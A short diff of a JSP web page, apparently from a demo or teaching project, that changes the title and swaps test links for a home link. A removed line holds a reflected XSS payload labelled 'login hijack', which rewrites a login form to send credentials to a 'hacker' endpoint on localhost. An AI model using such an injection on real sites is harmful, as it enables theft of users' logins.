@@ -2,7 +2,7 @@
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <html>
   <head>
-    <title>home</title>
+    <title>index.jsp under jsp</title>
   </head>
   <body>
 
@@ -23,12 +23,9 @@
             <input type="text" name="name" value="Tom" size="20">
             <input type="submit" value="Save People">
         </form>
+         <br>
 
-        <br>
-
-        <a href="http://localhost:7881/webmvc/login?id=E2000"> login </a>
-        <br>
-        <a href='http://localhost:7881/webmvc/login?id="><script> var f=document.getElementById("login"); f.action="http://localhost:7882/hacker"; f.method="get";</script><span+s=" '> login hijack </a>
+         <a href="static/html/helloWorld.html"> go Home  </a>
 
 
 
